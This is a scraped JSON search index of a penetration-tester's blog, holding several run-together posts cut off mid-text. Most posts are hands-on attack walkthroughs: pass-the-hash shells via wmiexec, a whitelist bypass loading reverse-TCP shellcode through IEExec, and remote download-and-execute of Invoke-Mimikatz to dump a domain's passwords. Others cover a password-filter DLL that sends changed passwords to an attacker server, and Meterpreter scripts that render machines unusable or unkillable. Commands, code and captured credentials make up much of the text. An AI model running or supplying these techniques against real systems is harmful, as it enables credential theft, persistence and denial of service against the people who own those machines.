","date":"2014-04-19","objectID":"https://malicious.link/posts/2014/2014-04-19-executing-code-via-smb-without-psexec/:2:0","tags":null,"title":"Executing code via SMB / DCOM without PSEXEC","uri":"https://malicious.link/posts/2014/2014-04-19-executing-code-via-smb-without-psexec/"},{"categories":["wmi","wmis","impacket"],"content":"wmiexec.py Using a password, but with hashes you just tell it -hashes : ","date":"2014-04-19","objectID":"https://malicious.link/posts/2014/2014-04-19-executing-code-via-smb-without-psexec/:3:0","tags":null,"title":"Executing code via SMB / DCOM without PSEXEC","uri":"https://malicious.link/posts/2014/2014-04-19-executing-code-via-smb-without-psexec/"},{"categories":["wmi","wmis","impacket"],"content":"Usage: root@wpad:~/impacket/examples# ./wmiexec.py Impacket v0.9.12-dev - Copyright 2002-2014 Core Security Technologies usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-hashes LMHASH:NTHASH] target [command [command ...]] positional arguments: target [domain/][username[:password]@]\u003caddress\u003e command command to execute at the target. If empty it will launch a semi-interactive shell optional arguments: -h, --help show this help message and exit -share SHARE share where the output will be grabbed from (default C$) -nooutput whether or not to print the output (no SMB connection created) authentication: -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH ","date":"2014-04-19","objectID":"https://malicious.link/posts/2014/2014-04-19-executing-code-via-smb-without-psexec/:3:1","tags":null,"title":"Executing code via SMB / DCOM without PSEXEC","uri":"https://malicious.link/posts/2014/2014-04-19-executing-code-via-smb-without-psexec/"},{"categories":["wmi","wmis","impacket"],"content":"Example: root@wpad:~/impacket/examples# ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 administrator@172.16.102.141 Impacket v0.9.12-dev - Copyright 2002-2014 Core Security Technologies SMBv2.1 dialect used [!] Launching semi-interactive shell - Careful what you execute C:\\\u003edir Volume in drive C has no label. Volume Serial Number is 5CCA-B528 Directory of C:\\ 07/13/2009 11:20 PM \u003cDIR\u003e PerfLogs 10/07/2013 03:26 PM \u003cDIR\u003e Program Files 07/14/2009 01:08 AM \u003cDIR\u003e Program Files (x86) 04/25/2014 02:21 AM \u003cDIR\u003e Users 05/11/2014 03:39 PM \u003cDIR\u003e Windows 0 File(s) 0 bytes 5 Dir(s) 52,884,389,888 bytes free C:\\\u003e ","date":"2014-04-19","objectID":"https://malicious.link/posts/2014/2014-04-19-executing-code-via-smb-without-psexec/:3:2","tags":null,"title":"Executing code via SMB / DCOM without PSEXEC","uri":"https://malicious.link/posts/2014/2014-04-19-executing-code-via-smb-without-psexec/"},{"categories":["scripting","dns"],"content":"Everyone has their list of hostnames they brute force domains with. In my last post I even mentioned a few ways to use one with XARGS or PARALLEL. But one fact about wordlist brute forcing is that there is no “one list to rule them all”. But over the years of doing DNS record collection I have noticed one thing, most domains have a large number of short hostnames that are easy to remember, usually 4 characters or less. I’m sure you already know where I’m going with this, I wanted to brute force all possible hostnames up to 4 characters. For a long time I struggled with coding this, but couldn’t wrap my head around it. I would come back to it every so often, finally a few days ago I happened upon a script on gist: https://gist.github.com/petehamilton/4755855 that suited my needs perfectly. I modified it to suite my needs (just use the yield method) and here is what I ended up with (remember DNS is case insensitive): Notice: This script doesn’t end, it will keep doing lookups on longer and longer hostnames until you hit CTRL-C #!/usr/bin/env ruby # ## Brute code stolen form: https://gist.github.com/petehamilton/4755855 # @domain = 'microsoft.com' def result?(sub) results = %x(dig +noall #{sub}.#{@domain} +answer) if results != \"\" puts \"============================\" puts \"FOUND: \\t#{sub}\" puts \"============================\" puts \"#{results}\" puts \"============================\" end 1 == 2 end def crack_yielding(chars) crack_yield(chars){ |p| return p if result?(p) } end def crack_yield(chars) chars.each { |c| yield c } crack_yield(chars) { |c| chars.each do |x| yield c + x end } end chars = ('a'..'z').to_a (0..9).each {|x| chars \u003c\u003c x.to_s} crack_yielding(chars) This worked but it was slow, so I sped it up using methods that I talked about in my last post and a quick modification: I used this: #!/usr/bin/env ruby # ## Brute code stolen form: https://gist.github.com/petehamilton/4755855 # def result?(sub) puts sub 1 == 2 end def crack_yielding(chars) crack_yield(chars){ |p| return p if result?(p) } end def crack_yield(chars) chars.each { |c| yield c } crack_yield(chars) { |c| chars.each do |x| yield c + x end } end chars = ('a'..'z').to_a (0..9).each {|x| chars \u003c\u003c x.to_s} crack_yielding(chars) which just prints all the possibilities: a b c d e f ... and piped it into parallel + dig: ruby brutelist.rb | parallel -j100 dig +noall {}.microsoft.com +answer and got the following: c.microsoft.com. 2 IN CNAME c.microsoft.akadns.net. c.microsoft.akadns.net. 499 IN A 65.55.58.184 e.microsoft.com. 3599 IN A 191.234.1.50 g.microsoft.com. 2798 IN CNAME g.msn.com. g.msn.com. 99 IN CNAME g.msn.com.nsatc.net. g.msn.com.nsatc.net. 148 IN A 131.253.34.154 i.microsoft.com. 779 IN CNAME i.toggle.www.ms.akadns.net. i.toggle.www.ms.akadns.net. 44 IN CNAME i.g.www.ms.akadns.net. i.g.www.ms.akadns.net. 225 IN CNAME i.microsoft.com.edgesuite.net. i.microsoft.com.edgesuite.net. 116 IN CNAME a1475.g.akamai.net. a1475.g.akamai.net. 16 IN A 23.45.65.26 a1475.g.akamai.net. 16 IN A 23.45.65.33 m.microsoft.com. 3599 IN CNAME origin.mobile.ms.akadns.net. origin.mobile.ms.akadns.net. 299 IN A 65.55.186.235 s.microsoft.com. 3599 IN CNAME reroute.microsoft.com. reroute.microsoft.com. 3599 IN A 65.55.58.201 reroute.microsoft.com. 3599 IN A 64.4.11.37 cs.microsoft.com. 81 IN CNAME wedcs.trafficmanager.net. wedcs.trafficmanager.net. 7 IN CNAME wedcseus.cloudapp.net. wedcseus.cloudapp.net. 8 IN A 137.116.48.250 ... Happy bruting. Both scripts can be found on my gists page: Domain version: https://gist.github.com/mubix/9107284 Parallel version: https://gist.github.com/mubix/9107276 ","date":"2014-02-19","objectID":"https://malicious.link/posts/2014/2014-02-19-iterative-dns-brute-forcing/:0:0","tags":null,"title":"Iterative DNS Brute Forcing","uri":"https://malicious.link/posts/2014/2014-02-19-iterative-dns-brute-forcing/"},{"categories":["cli","dig","dns"],"content":" Quick update: As @MikeDamm points out, xargs has a -P option that can do the same thing I’m using parallel for. If you have a supported version of xargs you can use -P 0 to do the same thing as -j0 with parallel, but if your version doesn’t support the 0 you can simply use the same number parallel uses ala: cat subdomains.txt | xargs -P 122 -I subdomain dig +noall subdomain.microsoft.com +answer This results in roughly the same completion time as it’s parallel counterpart. Thanks @MikeDamm! There are some great discussions on the NoVA Hackers mailing list. One such discussion was about what the best way to do dns hostname brute forcing was and which tool is better than another. For me, I just use the command line and then parse the results (or just ask the deepmagic.com database ;-) Here is what I do: First, you need a good list of DNS sub domains / hostnames. Personally I use the list provided over at http://www.ethicalhack3r.co.uk/zone-transfers-on-the-alexa-top-1-million/ (with a few minor tweaks). If you haven’t read that post and follow-on posts you really should. But take the list and save it locally. Then just run the following command: cat subdomains.txt | xargs -t -I subdomain dig +noall subdomain.microsoft.com +answer Now, xargs is great but does one thing at a time and can be quite slow if your subdomains list is large. With the use of the amazing tool GNU parallel you can get done in a matter of seconds, well, that or knock over your home router. cat subdomains.txt | parallel -k -j0 dig +noall {}.microsoft.com +answer Warning: the -j0 option maxes out the possible file handles and jobs that your CPU/kernel can handle, which usually destroys VMs. Just a smaller job count like 100 or 50 if you want the speed without the crash ;-) with an output something list this: parallel: Warning: Only enough file handles to run 122 jobs in parallel. Raising ulimit -n or /etc/security/limits.conf may help. parallel: Warning: No more file handles. Raising ulimit -n or /etc/security/limits.conf may help. mail.microsoft.com. 2369 IN A 131.107.125.5 www.microsoft.com. 0 IN CNAME toggle.www.ms.akadns.net. toggle.www.ms.akadns.net. 0 IN CNAME g.www.ms.akadns.net. g.www.ms.akadns.net. 0 IN CNAME lb1.www.ms.akadns.net. lb1.www.ms.akadns.net. 263 IN A 64.4.11.42 m.microsoft.com. 0 IN CNAME origin.mobile.ms.akadns.net. origin.mobile.ms.akadns.net. 300 IN A 65.55.186.235 ftp.microsoft.com. 0 IN CNAME ftp.microsoft.akadns.net. ftp.microsoft.akadns.net. 259 IN A 64.4.17.176 mobile.microsoft.com. 0 IN CNAME origin.mobile.ms.akadns.net. origin.mobile.ms.akadns.net. 300 IN A 65.55.186.235 smtp.microsoft.com. 3600 IN A 131.107.115.215 smtp.microsoft.com. 3600 IN A 131.107.115.214 smtp.microsoft.com. 3600 IN A 205.248.106.64 smtp.microsoft.com. 3600 IN A 205.248.106.30 smtp.microsoft.com. 3600 IN A 205.248.106.32 smtp.microsoft.com. 3600 IN A 131.107.115.212 search.microsoft.com. 0 IN CNAME search.microsoft.akadns.net. search.microsoft.akadns.net. 0 IN CNAME search.msn.com.edgesuite.net. search.msn.com.edgesuite.net. 0 IN CNAME a134.g.akamai.net. a134.g.akamai.net. 19 IN A 209.107.220.27 a134.g.akamai.net. 19 IN A 209.107.220.35 dev.microsoft.com. 0 IN CNAME msdn.microsoft.com. msdn.microsoft.com. 0 IN CNAME msdn.microsoft.akadns.net. msdn.microsoft.akadns.net. 600 IN A 157.56.148.19 img.microsoft.com. 0 IN CNAME i.microsoft.com.edgesuite.net. i.microsoft.com.edgesuite.net. 0 IN CNAME a1475.g.akamai.net. a1475.g.akamai.net. 20 IN A 165.254.158.48 a1475.g.akamai.net. 20 IN A 165.254.158.9 news.microsoft.com. 0 IN CNAME msnews.microsoft.com. msnews.microsoft.com. 3600 IN A 207.46.248.16 mail2.microsoft.com. 3600 IN A 131.107.115.215 beta.microsoft.com. 0 IN CNAME connect.microsoft.akadns.net. connect.microsoft.akadns.net. 300 IN A 65.52.103.84 support.microsoft.com. 0 IN CNAME mso-geo.microsoft.akadns.net. mso-geo.microsoft.akadns.net. 0 IN CNAME support.microsoft.akadns.net. support.microsoft.akadns.net. 175 IN A 157.56.56.139 my.microsoft.com. 360","date":"2014-01-29","objectID":"https://malicious.link/posts/2014/2014-01-29-hostname-bruteforcing-on-the-cheap/:0:0","tags":null,"title":"Hostname bruteforcing on the cheap","uri":"https://malicious.link/posts/2014/2014-01-29-hostname-bruteforcing-on-the-cheap/"},{"categories":["shmoocon","cons","defense","java","emet"],"content":" Attacker Ghost Stories - ShmooCon 2014 from Rob Fuller ","date":"2014-01-18","objectID":"https://malicious.link/posts/2014/2014-01-18-attacker-ghost-stories-shmoocon-2014/:0:0","tags":null,"title":"Attacker Ghost Stories - ShmooCon 2014","uri":"https://malicious.link/posts/2014/2014-01-18-attacker-ghost-stories-shmoocon-2014/"},{"categories":null,"content":"Guest post by @subTee There was a recent presentation at DerbyCon, entitled: Living Off the Land: A Minimalist’s Guide to Windows Post-Exploitation by Christopher Campbell \u0026 Matthew Graeber I highly recommend that you start with this presentation as it lays the foundation for this post. The premise is, how can we maintain persistence in a corporate environment, using tools and defaults provided by the host OS we have compromised. This is a very important concept, given the shift in many organizations to an Application Whitelisting Defense model. It is only a matter of time before time before you might encounter an Application Whitelisting Defense. As a follow up to that presentation, I began exploring the binaries that ship by default with Windows. That is where I stumbled across a binary in the C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727 path. The Executable is ieexec.exe. A write up is here: http://support.microsoft.com/kb/822485 “The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.” Excellent! So, now we just need to host our malicious binary , and call it from ieexec.exe. This is great, since most Application Whitelisting Environments are going to “Trust” anything signed my Microsoft as a matter of convenience. IEexec.exe will download and execute our code for us, all under the trusted process. So lets get started! Step 1. Prepare your Shellcode, or whatever malicious app you want. I compiled my executable using SharpDevelop, since it has less footprint than a full blown Visual Studio install. From msfconsole: msf \u003e use windows/x64/shell/reverse_tcp msf payload(reverse_tcp) \u003e set LHOST x.x.x.x msf payload(reverse_tcp) \u003e set LPORT 443 msf payload(reverse_tcp) \u003e generate -t csharp ￼ byte[] buf = new byte[422] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52... \u003cSnipped Full ShellCode for Brevity\u003e Step 2. Create the .NET wrapper application using System; using System.Runtime.InteropServices; namespace native { class Program { private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; private static UInt32 MEM_RELEASE = 0x8000; public static void Main(string[] args) { // native function's compiled code byte[] proc = new byte[] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52... //Edited ShellCode For Brevity }; UInt32 funcAddr = VirtualAlloc(0, (UInt32)proc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(proc, 0, (IntPtr)(funcAddr), proc.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; // prepare data PROCESSOR_INFO info = new PROCESSOR_INFO(); IntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESSOR_INFO))); Marshal.StructureToPtr(info, pinfo, false); // execute native code hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); // retrive data info = (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, typeof(PROCESSOR_INFO)); Marshal.FreeHGlobal(pinfo); CloseHandle(hThread); VirtualFree((IntPtr)funcAddr, 0, MEM_RELEASE); } [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId ); [DllImport(\"kernel32\")] private static extern bool CloseHandle(IntPtr handle); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); [DllImport(\"kernel32\")] private static extern IntPtr GetModuleHandle( string moduleName ); [DllImport(\"kernel32","date":"2014-01-16","objectID":"https://malicious.link/posts/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/:1:0","tags":["whitelisting","ieexec"],"title":"Application Whitelist Bypass using IEexec.exe","uri":"https://malicious.link/posts/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/"},{"categories":["metasploit minute","presentations","windows 8","metasploit"],"content":" Show URL: Hak5 Youtube URL: YouTube Show RSS feed: RSS ","date":"2014-01-13","objectID":"https://malicious.link/posts/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/:0:0","tags":null,"title":"Installing Metasploit Community Edition on Windows 8","uri":"https://malicious.link/posts/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/"},{"categories":null,"content":"Since I’ve been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find OJ’s write up on it and more amazing things he did in 3 months of meterpreter and on the Metasploit blog. Just brushing the surface and to help people see the power of this new functionality I went ahead and created a few Meterpreter scripts that can really mess with someone. 1st is a script that loops through all of the windows for your current user and sets the focus to them in rotation. Essentially making their machine unusable. Source: https://gist.github.com/mubix/8050500 # Code loops around each of the windows # that the current user has open and switches # focus to each of them in rotation... 100 times. (0..100).each do |x| windows = client.extapi.window.enumerate windows.each do |winder| if winder[:title] != 'Default IME' result = client.railgun.user32.SetForegroundWindow(winder[:handle]) end end print_status(\"Round #{x}\") end 2nd just sets all of the windows title’s the say “hacked” Source: https://gist.github.com/mubix/8050592 windows = client.extapi.window.enumerate windows.each do |winder| if winder[:title] != 'Default IME' result = client.railgun.user32.SetWindowTextA(winder[:handle],\"Hacked\") end end and finally if in Windows if you close all of the windows, including “invisible” ones like Explorer, you will essentially make the machine unusable. Source: https://gist.github.com/mubix/8050653 windows = client.extapi.window.enumerate windows.each do |winder| result = client.railgun.user32.CloseWindow(winder[:handle]) end OJ suggested a few other options: Destroy: windows = client.extapi.window.enumerate windows.each do |winder| result = client.railgun.user32.DestroyWindow(winder[:handle]) end or Minimize all: windows = client.extapi.window.enumerate windows.each do |winder| result = client.railgun.user32.ShowWindow(winder[:handle], 6) end Thats it for now, next up we will do a few things with services as well as the clipboard. Stay tuned! ","date":"2014-01-10","objectID":"https://malicious.link/posts/2014/2014-01-10-extapi-pranks/:0:0","tags":null,"title":"ExtAPI Pranks","uri":"https://malicious.link/posts/2014/2014-01-10-extapi-pranks/"},{"categories":["rant"],"content":"I’ve taken a rather long hiatus from blogging. This is mostly because I was fed up with the blogging platform that I had (Squarespace) and didn’t really have any alternatives that met all of the features I wanted. So, where am I at now? Github actually. Github allows users to create “Github Pages” for repositories (or be it’s own repo). For the most part these pages are written in Markdown. It’s late and I don’t feel like looking up who, but someone created a project called “Jekyll” which is a Ruby based static page generator and then another project called “Octopress” popped up using Jekyll to create a static html based blogging platform. It’s a bit of a pain in the butt to use and learn, but once you have a few things automated it gets simpler. It also hits the most bullet points of any other option. Expect things to pick up pretty quickly here, but as I’m typing this I’m already thinking that promising something like that is a bad idea. We’ll see how it goes, it’s just good to be back. ","date":"2014-01-09","objectID":"https://malicious.link/posts/2014/2014-01-09-alive-again/:0:0","tags":null,"title":"Alive Again","uri":"https://malicious.link/posts/2014/2014-01-09-alive-again/"},{"categories":["hak5","metasploit","presentations","metasploit minute"],"content":" Show URL: Hak5 Youtube URL: YouTube Show RSS feed: RSS ","date":"2014-01-06","objectID":"https://malicious.link/posts/2014/2014-01-06-metasploit-minute-mondays-with-mubix/:0:0","tags":null,"title":"Metasploit Minute - Mondays with Mubix - Episode 1","uri":"https://malicious.link/posts/2014/2014-01-06-metasploit-minute-mondays-with-mubix/"},{"categories":["mimikatz","cli"],"content":"clymb3r recently posted a script called “Invoke-Mimikatz.ps1” basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL. You can very easily use this script directly from an admin command prompt as so: powershell \"IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds\" (This works REALLY well for Citrix and Kiosk scenarios and it’s too hard to type/remember) This runs the powershell script by directly pulling it from Github and executing it “in memory” on your system. One of the awesome added capabilities for this script is to run on a list of hosts. as so: powershell \"IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds -ComputerName @('computer1', 'computer2')\" This works great as all the output is directly on your system and all executed through Powershell Remoting. Powershell Remoting is pretty much the same as WinRM. This service however is not enabled by default and can be pretty hit or miss on how much any given enterprise uses WinRM. However, it is usually the servers and more important systems that have it enabled more often than not. You can find WinRM / PowerShell Remoting by scanning for the service port 47001 as well as the default comm ports for WinRM 5985 (HTTP) and 5986 (HTTPS). If you find that your target isn’t a WinRM rich environment or you just want more passwords you can take a slightly more painful route, I call it “Mass Mimikatz” Step 1. Make a share, we are doing this so we can not only collect the output of all our computers passwords, but to host the CMD batch file that will run the powershell script: cd\\ mkdir open net share open=C:\\open /grant:everyone,full icacls C:\\open\\ /grant Everyone:(OI)(CI)F /t We are setting “Everyone” permissions on a Share (net share) and NTFS (icacls) level for this to work properly. Step 2. Set registry keys. There are two registry keys that we need to set. The first allows Null Sessions to our new share and the second allows null users to have the “Everyone” token so that we don’t have to get crazy with our permissions. I have create a meterpreter script that has a bunch of error checking here: massmimi_reg.rb or you can just make the following changes\" HKLM\\System\\CurrentControlSet\\services\\LanmanServer\\Parameters NullSessionShares REG_MULTI_SZ = open HKLM\\System\\CurrentControlSet\\Contol\\Lsa \"EveryoneIncludesAnonymous\" = 1 Step 3. Change directory into new “open” directory. This is so our uploads and in particular our web server will be hosted out of the correct directory. Step 4. Upload powershell script powermeup.cmd - this script will run our hosted Invoke-Mimikatz script on each host: powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.127:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds \u003e \\\\192.168.1.127\\open\\%COMPUTERNAME%.txt 2\u003e\u00261 Step 5. Upload clymb3r’s Invoke-Mimikatz ps1 - Download from PowerSploit repo: source on github Step 6. Upload mongoose: Downloads Page - Both regular and tiny versions work. This is an awesome, single executable webserver that supports LUA, Sqlite, and WebDAV out of the box. Tiny version is under 100k. Step 7. Upload serverlist.txt - This is a line by line list of computer names to use mimikatz on. You’ll have to gather this one way or another. Step 8. Execute mongoose (from directory with mimikatz.ps1) - This will start a listener with directory listings enabled on port 8080 by default Step 9a. Execute wmic: wmic /node:@serverlist.txt process call create \"\\\\192.168.92.127\\open\\powershellme.cmd\" Step 9b. Execute wmic with creds: wmic /node:@serverlist.txt /user:PROJECTMENTOR\\jdoe /password:ASDqwe123 process call create \"\\\\192.168.92.127\\open\\powershellme.cmd\" Step 10. Watch as text files full of wonder and joy fill your share. You can find the scripts here: https://github.com/mubix","date":"2013-10-05","objectID":"https://malicious.link/posts/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/:0:0","tags":null,"title":"Dumping a domain worth of passwords with mimikatz","uri":"https://malicious.link/posts/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/"},{"categories":null,"content":"cross posted from: http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html The tired and true method for Zone Transfers are using either nslookup: nslookup ls -d domain.com.local Or dig: dig -t AXFR domain.com.local @ns1.domain.com.local In the Windows Enterprise world there are a few more options. If you are a DNS Admin you can use the ‘dnscmd’ command like so: dnscmd /EnumZones dnscmd /ZonePrint domain.com.local Which is handy if you can pop the DNS server (usually the Domain Controller so you usually have better things to do at that point). You can also use PowerShell: PS C:\\Users\\jdoe\u003e get-wmiobject -ComputerName dc1 -Namespace root\\microsoftDNS -Class MicrosoftDNS_ResourceRecord -Filter \"domainname='projectmentor.net'\" | select textrepresentation Again, this requires you to be a very high privileged account, which is no fun. I need these computer lists as part of my internal / post-exploitation recon, not an end step. For the longest time I relied on a very awesome tool called “Adfind”: adfind -sc computers_active -csv -nodn -nocsvq -nocsvheader This command will output a list of computer accounts that have been active in the last 90 days in a straight line by line format (hence all of the no “this\"and no “that” flags) But that wasn’t good enough, this image kept haunting me: It’s Active Directory Explorer by SysInternals. It shows the complete list of DNS records, stored as objects in Active Directory that I was able to get to as a basic domain user. This means all of the static DNS records for the unix systems and mainframes and other systems outside of the purely Windows world are there as well. I spent 4 days attempting to write my own script, ldap query, prayer to get all of the data out but was unsuccessful. On the 5th day I happened upon a very short post saying “I did it”, as I probably would have written the same. It comes in the form of a PowerShell script that you can find here: Code: https://github.com/mmessano/PowerShell/blob/master/dns-dump.ps1 And is very easy to run: PS C:\\Users\\jdoe\u003e dns-dump.ps1 -zone projectmentor.net -dc dc1 or C:\\\u003e powershell -ep bypass -f dnsdump.ps1 -zone projectmentor.net -dc dc1 If you put a -csv on the end of those the author has even given you the CSV format which makes the output extremely easy to parse. Now you can throw your list into your tool of choice instead of scanning random IP ranges on the targets network for important stuff you can scan directly against known good hosts. – mubix P.S. Yes I realize this isn’t actually “Zone Transfer\"s but its close enough ","date":"2013-10-04","objectID":"https://malicious.link/posts/2013/ad-zone-transfers-as-a-user/:0:0","tags":["windows","dns","activedirectory","dig","nslookup","dnscmd","adfind","powershell"],"title":"AD Zone Transfers as a user","uri":"https://malicious.link/posts/2013/ad-zone-transfers-as-a-user/"},{"categories":["passwords","releases"],"content":"Password Filters [0] are a way for organizations and governments to enforce stricter password requirements on Windows Accounts than those available by default in Active Directory Group Policy. It is also fairly documented on how to Install and Register Password Filters [1]. Basically what it boils down to is updating a registry key here: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages with the name of a DLL (without the extension) that you place in Windows\\System32\\ For National CCDC earlier this year (2013), I created an installer and “evil pass filter” that basically installed itself as a password filter and any time any passwords changed it would store the change to a log file locally to the victim (in clear text) as well as issue an HTTP basic auth POST to a server I own with the username and password. The full code can be found below. I’ll leave the compiling up to you but basically its slamming the code in Visual Studio, telling it its a DLL, and clicking build for the architecture you are targeting (Make sure to use the Internet Open access settings that make the most sense for the environment you are using this in [2]. So lets walk the exploitation: First, you have to be admin or system, as this is more of a persistence method than anything. meterpreter \u003e getuid Server username: NT AUTHORITY\\SYSTEM Next, we upload the evilpassfilter.dll to Sytem32: meterpreter \u003e pwd C:\\Windows\\system32 meterpreter \u003e upload /tmp/evilpassfilter.dll . [*] uploading : /tmp/evilpassfilter.dll -\u003e . [*] uploaded : /tmp/evilpassfilter.dll -\u003e .\\evilpassfilter.dll Then we need to query what is already in the notification packages list: meterpreter \u003e reg queryval -k HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa -v \"Notification Packages\" Key: HKLM\\System\\CurrentcontrolSet\\Control\\Lsa Name: Notification Packages Type: Data: sceclirassfm What you can’t see here since Metasploit isn’t showing the line breaks is that there are two there by default: scecli rassfm We need to add ours to the end of this list, unfortunately at the current point of time its impossible to do directly from the meterpreter command line (as far as I know). So we need to drop a .reg file and manually import it. Easiest way to do that is to add your “evilpassfilter” string as well as the ones on the victim to a VM you have and export it. Should look like this: Once we have our file, we upload and import it using reg command: meterpreter \u003e upload importme.reg . [*] uploading : importme.reg -\u003e . [*] uploaded : importme.reg -\u003e .\\importme.reg meterpreter \u003e execute -H -f regedit.exe -a '/s importme.reg' Process 2628 created. meterpreter \u003e Double check our work: meterpreter \u003e reg queryval -k HKLM\\\\System\\\\CurrentcontrolSet\\\\Control\\\\Lsa -v \"Notification Packages\" Key: HKLM\\System\\CurrentcontrolSet\\Control\\Lsa Name: Notification Packages Type: Data: sceclirnrassfmrnevilpassfilter Its there, w00t! But it doesn’t do anything until a reboot happens :(. Lets just force that to happen (not the most stealthy thing to do): meterpreter \u003e reboot Rebooting... While thats going on, lets set up the server to catch the basic auth. msf exploit(psexec) \u003e use auxiliary/server/capture/http_basic msf auxiliary(http_basic) \u003e set URIPATH / URIPATH =\u003e / msf auxiliary(http_basic) \u003e run [*] Auxiliary module execution completed msf auxiliary(http_basic) \u003e [*] Listening on 0.0.0.0:80... [*] Using URL: http://0.0.0.0:80/ [*] Local IP: http://192.168.92.106:80/ [*] Server started. msf auxiliary(http_basic) \u003e Then we wait for a password to be changed: msf auxiliary(http_basic) \u003e [*] 192.168.92.106 http_basic - Sending 401 to client [+] 192.168.92.106 - Credential collected: \"jack:ASDqwe123\" =\u003e / No matter how complex their password is and without having a shell on the box anymore: msf auxiliary(http_basic) \u003e [+] 192.168.92.106 - Credential collected: \"jack:a?'z_a4#RRK(mvQEsyQ8l`,JR.pes\u003c;6#0$puQ%Q\u0026,@ZwY(T@p\" =\u003e / This works from Windows 2000, XP all the way up to Windows 8 \u0026 2012. Ok","date":"2013-09-11","objectID":"https://malicious.link/posts/2013/2013-09-11-stealing-passwords-every-time-they-change/:0:0","tags":null,"title":"Stealing passwords every time they change","uri":"https://malicious.link/posts/2013/2013-09-11-stealing-passwords-every-time-they-change/"},{"categories":["proxychains","proxy","dns"],"content":"If you’ve ever used proxychains to push things through Meterpreter, one of the most annoying things is its “hardcoded” DNS setting for 4.2.2.2, if the org that you are going after doesn’t allow this out of their network, or if you are trying to resolve an internal asset, you’re SOL. After a ton of googling and annoyed head slams into walls every time I forget where this is I’ve finally decided to make a note of it. There isn’t much magic here other than knowing that this file exists, but /bin/proxyresolv is a bash script that calls “dig” using TCP and the DNS server specified so it goes through the proxychains. Here is what it looks like: (on Kali linux its found here: /usr/lib/proxychains3/proxyresolv) #!/bin/sh # This script is called by proxychains to resolve DNS names # DNS server used to resolve names DNS_SERVER=4.2.2.2 if [ $# = 0 ] ; then echo \" usage:\" echo \" proxyresolv \u003chostname\u003e \" exit fi export LD_PRELOAD=libproxychains.so.3 dig $1 @$DNS_SERVER +tcp | awk '/A.+[0-9]+\\.[0-9]+\\.[0-9]/{print $5;}' Now you could just make the dig request yourself through proxychains then throw whatever you originally attended directly at an IP, or you can make the DNS_SERVER change and hardcode your engagement’s internal IP, up to you, but now its documented and I’ll never have to go searching like crazy again… as long as I remember that its on someone else’s blog. ","date":"2013-09-10","objectID":"https://malicious.link/posts/2013/2013-09-10-changing-proxychains-hardcoded-dns-server/:0:0","tags":null,"title":"Changing proxychains hardcoded DNS server","uri":"https://malicious.link/posts/2013/2013-09-10-changing-proxychains-hardcoded-dns-server/"},{"categories":null,"content":"Saw this post about a kernel bug in 64 bit Windows that is a DoS, it can also create an unkillable process: Blog post: http://waleedassar.blogspot.com/2013/02/kernel-bug-1-processiopriority.html Figured I’d take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had. Started with the C code for the bug: http://pastebin.com/QejGQXib along with the only resource I could find about the actual function: http://processhacker.sourceforge.net/doc/ntfill_8h.html#a6557e0dd024f0e9fa6132eb52d12810a I came up with this: client.railgun.add_function('ntdll','ZwSetInformationProcess','DWORD',[ [\"DWORD\",\"ProcessHandle\",\"in\"], [\"DWORD\",\"ProcessInformationClass\",\"in\"], [\"DWORD\",\"ProcessInformation\",\"inout\"], [\"DWORD\",\"ProcessInformationLength\",\"in\"], ]) processinfo = 0x8000F129 tproc = client.sys.process.open tmem = tproc.memory.allocate(4) tproc.memory.write(tmem,processinfo) cpidhandle = client.railgun.kernel32.GetCurrentProcess()['return'] client.railgun.ntdll.ZwSetInformationProcess(cpidhandle,0x21,tmem,0x4) ScriptJunkie quickly identified that I was using a DWORD for a Handle and using 4 bits for a 64 bit process (should be 8) as well as the fact that I could use a PDWORD with the ProcessInformation inout parameter instead of writing it to memory myself. The result: client.railgun.add_function('ntdll','ZwSetInformationProcess','DWORD',[ [\"HANDLE\",\"ProcessHandle\",\"in\"], 